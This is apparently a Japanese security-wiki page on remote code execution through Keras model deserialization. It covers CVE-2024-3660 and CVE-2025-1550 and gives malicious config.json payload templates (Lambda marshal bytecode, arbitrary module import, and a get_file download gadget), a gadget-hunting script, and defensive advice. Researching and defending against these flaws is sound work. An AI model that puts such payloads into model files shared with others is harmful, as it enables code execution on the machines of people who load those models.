# KerasモデルのデシリアライズRCEとガジェットハンティング

{{#include ../../banners/hacktricks-training.md}}

このページでは、Kerasモデルのデシリアライズパイプラインに対する実用的なエクスプロイト技術を要約し、ネイティブな.kerasフォーマットの内部構造と攻撃面を説明し、モデルファイルの脆弱性（MFV）を見つけるための研究者ツールキットと修正後のガジェットを提供します。

## .kerasモデルフォーマットの内部構造

.kerasファイルは、少なくとも以下を含むZIPアーカイブです：
- metadata.json – 一般的な情報（例：Kerasバージョン）
- config.json – モデルアーキテクチャ（主な攻撃面）
- model.weights.h5 – HDF5形式の重み

config.jsonは再帰的なデシリアライズを駆動します：Kerasはモジュールをインポートし、クラス/関数を解決し、攻撃者が制御する辞書からレイヤー/オブジェクトを再構築します。

Denseレイヤーオブジェクトの例のスニペット：
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
デシリアライズは以下を実行します：
- モジュールのインポートとモジュール/クラス名キーからのシンボル解決
- 攻撃者が制御するkwargsを使用したfrom_config(...)またはコンストラクタの呼び出し
- ネストされたオブジェクト（アクティベーション、イニシャライザー、制約など）への再帰

歴史的に、これはconfig.jsonを作成する攻撃者に対して3つのプリミティブを露出させました：
- インポートされるモジュールの制御
- 解決されるクラス/関数の制御
- コンストラクタ/from_configに渡されるkwargsの制御

## CVE-2024-3660 – Lambda-layerバイトコードRCE

根本原因：
- Lambda.from_config()はpython_utils.func_load(...)を使用し、攻撃者のバイトに対してbase64デコードしmarshal.loads()を呼び出します；Pythonのアンマシャリングはコードを実行する可能性があります。

エクスプロイトアイデア（config.json内の簡略化されたペイロード）：
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
緩和策:
- Kerasはデフォルトでsafe_mode=Trueを強制します。Lambda内のシリアライズされたPython関数は、ユーザーが明示的にsafe_mode=Falseを選択しない限りブロックされます。

注意事項:
- レガシーフォーマット（古いHDF5保存）や古いコードベースは、最新のチェックを強制しない場合があるため、被害者が古いローダーを使用する際には「ダウングレード」スタイルの攻撃が依然として適用される可能性があります。

## CVE-2025-1550 – Keras ≤ 3.8における任意のモジュールインポート

根本原因:
- _retrieve_class_or_fnは、config.jsonから攻撃者が制御するモジュール文字列を使用して制限のないimportlib.import_module()を使用しました。
- 影響: インストールされた任意のモジュール（またはsys.path上の攻撃者が植え付けたモジュール）の任意のインポート。インポート時にコードが実行され、その後攻撃者のkwargsでオブジェクトが構築されます。

エクスプロイトアイデア:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
セキュリティの改善 (Keras ≥ 3.9):
- モジュールホワイトリスト: インポートは公式エコシステムモジュールに制限される: keras, keras_hub, keras_cv, keras_nlp
- セーフモードデフォルト: safe_mode=True は安全でないLambdaシリアライズ関数の読み込みをブロックする
- 基本的な型チェック: デシリアライズされたオブジェクトは期待される型と一致しなければならない

## ホワイトリスト内のポストフィックスガジェットサーフェス

ホワイトリストとセーフモードがあっても、許可されたKerasコール可能なものの間には広範なサーフェスが残る。例えば、keras.utils.get_fileは任意のURLをユーザーが選択可能な場所にダウンロードできる。

許可された関数を参照するLambda経由のガジェット (シリアライズされたPythonバイトコードではない):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
重要な制限事項:
- Lambda.call() は、ターゲットの呼び出し可能な関数を呼び出す際に、入力テンソルを最初の位置引数として追加します。選択されたガジェットは、追加の位置引数を許容する必要があります（または *args/**kwargs を受け入れる必要があります）。これにより、利用可能な関数が制約されます。

許可されたガジェットの潜在的な影響:
- 任意のダウンロード/書き込み（パスの植え付け、設定の毒性）
- 環境に応じたネットワークコールバック/SSRFのような効果
- 書き込まれたパスが後でインポート/実行されるか、PYTHONPATHに追加される場合、または書き込み時に実行可能な場所が存在する場合に、コード実行へのチェーン

## 研究者ツールキット

1) 許可されたモジュール内での体系的なガジェット発見

keras、keras_nlp、keras_cv、keras_hub全体で候補となる呼び出し可能な関数を列挙し、ファイル/ネットワーク/プロセス/環境の副作用を持つものを優先します。
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) 直接デシリアライズテスト（.kerasアーカイブは不要）

作成した辞書をKerasデシリアライザに直接入力して、受け入れられるパラメータを学び、副作用を観察します。
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) クロスバージョンプロービングとフォーマット

Kerasは異なるガードレールとフォーマットを持つ複数のコードベース/時代に存在します：
- TensorFlow内蔵Keras: tensorflow/python/keras (レガシー、削除予定)
- tf-keras: 別途メンテナンス
- マルチバックエンドKeras 3 (公式): ネイティブ .keras を導入

コードベースとフォーマット（.keras vs レガシー HDF5）を通じてテストを繰り返し、リグレッションや欠落したガードを明らかにします。

## 防御的推奨事項

- モデルファイルを信頼できない入力として扱います。信頼できるソースからのみモデルをロードしてください。
- Kerasを最新の状態に保ちます；allowlistingと型チェックの恩恵を受けるためにKeras ≥ 3.9を使用してください。
- モデルをロードする際にsafe_mode=Falseを設定しないでください。ファイルを完全に信頼している場合を除きます。
- ネットワークエグレスがなく、ファイルシステムアクセスが制限されたサンドボックス環境でデシリアライズを実行することを検討してください。
- 可能な限りモデルソースと整合性チェックのためにallowlist/署名を強制します。

## 参考文献

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
